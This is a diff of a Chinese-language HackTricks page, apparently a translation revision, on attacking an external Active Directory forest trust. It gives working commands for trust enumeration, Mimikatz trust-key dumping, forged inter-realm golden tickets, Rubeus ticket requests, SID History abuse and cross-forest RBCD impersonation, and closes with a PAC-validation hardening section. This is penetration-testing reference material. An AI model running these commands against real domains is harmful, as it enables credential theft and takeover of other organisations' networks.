@@ -1,12 +1,12 @@
-# 外部林域 - 单向（入站）或双向
+# External Forest Domain - OneWay (Inbound) 或 bidirectional
 
 {{#include ../../banners/hacktricks-training.md}}
 
-在本场景中，外部域信任你（或双方互相信任），因此你可以对其获得某种访问权限。
+在此场景中，某个 external domain 信任你（或者双方互相信任），因此你可以获得对其的某种访问权限。
 
-## 枚举
+## Enumeration
 
-首先，你需要**枚举**该**信任**：
+首先，你需要对 **trust** 进行 **enumerate**：
 ```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -59,15 +59,15 @@ IsDomain     : True
 # Additional trust hygiene checks (AD RSAT / AD module)
 Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
 ```
-> `SelectiveAuthentication`/`SIDFiltering*` 让你快速判断跨林滥用路径 (RBCD, SIDHistory) 是否有可能在不需额外前提的情况下奏效。
+> `SelectiveAuthentication`/`SIDFiltering*` 可以快速判断跨 forest abuse paths（RBCD、SIDHistory）是否可能在没有额外 prerequisites 的情况下生效。<sup>[[2]](#references)</sup>
 
-在先前的枚举中发现用户 **`crossuser`** 属于 **`External Admins`** 组，该组在 **外部域的 DC** 内具有 **Admin access**。
+在之前的 enumeration 中发现，用户 **`crossuser`** 位于 **`External Admins`** 组中，该组在外部域的 **DC** 内拥有 **Admin access**。
 
-## 初始访问
+## Initial Access
 
-如果你 **couldn't** 在另一个域中找到你的用户具有任何 **special** 访问权限，你仍然可以回到 AD Methodology 并尝试从 **privesc from an unprivileged user**（例如 kerberoasting 等方法）：
+如果你**无法**发现你的用户在另一个域中的任何**特殊** access，仍然可以回到 AD Methodology，尝试从 **unprivileged user** 开始进行 **privesc**（例如 kerberoasting）：
 
-你可以使用 **Powerview functions** 来 **枚举** **另一个域**，使用 `-Domain` param 像下面这样：
+你可以使用 **Powerview functions**，通过 `-Domain` 参数对**另一个域**进行 enumeration，例如：
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -75,28 +75,28 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ./
 {{#endref}}
 
-## 冒充
+## Impersonation
 
-### 登录
+### Logging in
 
-使用常规方法并利用对外部域具有访问权限的用户凭据，您应该能够访问：
+使用拥有外部域访问权限的用户凭据，通过常规方法登录，你应该能够访问：
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### SID History Abuse
 
-你也可以在林信任中滥用 [**SID History**](sid-history-injection.md)。
+你也可以跨 forest trust 滥用 [**SID History**](sid-history-injection.md)。
 
-如果用户被**从一个林迁移到另一个林**并且**SID Filtering 未启用**，则可能**添加来自另一个林的 SID**，并且该 **SID** 将在**跨越信任**进行身份验证时**被添加**到**用户的 token**。
+如果用户从 **一个 forest 迁移到另一个 forest**，且未启用 **SID Filtering**，则可以**添加来自另一个 forest 的 SID**；用户在**跨 trust 进行身份验证**时，该 **SID** 会被**添加到用户的 token** 中。
 
 > [!WARNING]
-> 提醒：你可以使用以下命令获取签名密钥
+> 提醒一下，你可以使用以下命令获取签名密钥：
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-你可以**使用** **受信任的** 密钥对**伪装为当前域用户的 TGT**进行**签名**。
+你可以使用 **trusted** 密钥进行签名，伪装成当前 domain 的用户创建 **TGT**。
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -107,7 +107,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### 完整方式：模拟用户
+### 完整的用户冒充方法
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -121,9 +121,9 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Cross-forest RBCD — 当你在信任林中控制机器账户时 (no SID filtering / selective auth)
+### 当你控制信任林中的机器账户时的跨林 RBCD（无 SID filtering / selective auth）
 
-如果你的 foreign principal (FSP) 使你成为一个可以在信任林中写入 computer objects 的组的成员（例如 `Account Operators`、custom provisioning group），你可以在该林的目标主机上配置 **Resource-Based Constrained Delegation** 并冒充那里的任意用户：
+如果你的 foreign principal (FSP) 使你加入了一个能够在信任林中写入 computer objects 的组（例如 `Account Operators`、自定义 provisioning group），你就可以在该林的目标主机上配置 **Resource-Based Constrained Delegation**，并对其中的任意用户执行 impersonate：
 ```bash
 # 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
 # 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
@@ -134,14 +134,15 @@ Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=
 # 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
 Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
 ```
-这仅在 **SelectiveAuthentication 被禁用** 并且 **SID filtering** 未剥离你所控制的 SID 时有效。它是一条快速的横向通道，可以绕过 SIDHistory 伪造，并且常在信任审查中被忽略。
+This 仅在 **SelectiveAuthentication is disabled** 且 **SID filtering** 不会剥离你的控制 SID 时有效。这是一条避开 SIDHistory forging 的快速横向路径，在 trust review 中经常被忽略。<sup>[[2]](#references)</sup>
 
-### PAC 验证加固
+### PAC validation hardening
 
-针对 **CVE-2024-26248**/**CVE-2024-29056** 的 PAC 签名验证更新对跨林票证增加了签名强制。在 **Compatibility mode** 下，伪造的跨域 PAC/SIDHistory/S4U 路径在未打补丁的 DCs 上仍可能生效。在 **Enforcement mode** 下，未经签名或被篡改的穿越 forest trust 的 PAC 数据将被拒绝，除非你也拥有目标 forest trust 的密钥。注册表覆盖（`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`）在仍可用时可以削弱此限制。
+针对 **CVE-2024-26248**/**CVE-2024-29056** 的 PAC signature validation 更新，增加了对 inter-forest tickets 的 signing enforcement。在 **Compatibility mode** 下，伪造的 inter-realm PAC/SIDHistory/S4U paths 仍可能在未打补丁的 DC 上生效。在 **Enforcement mode** 下，除非你同时持有目标 forest trust key，否则跨越 forest trust 的 unsigned 或被篡改的 PAC data 将被拒绝。Registry overrides（`PacSignatureValidationLevel`、`CrossDomainFilteringLevel`）在仍可用期间可能削弱此保护。<sup>[[1]](#references)</sup>
 
-## 参考
+## References
 
-- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
-- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
+- [1] [Microsoft KB5037754 – 针对 CVE-2024-26248 和 CVE-2024-29056 的 PAC validation changes](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
+- [2] [MS-PAC spec – SID filtering 与 claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
+
 {{#include ../../banners/hacktricks-training.md}}
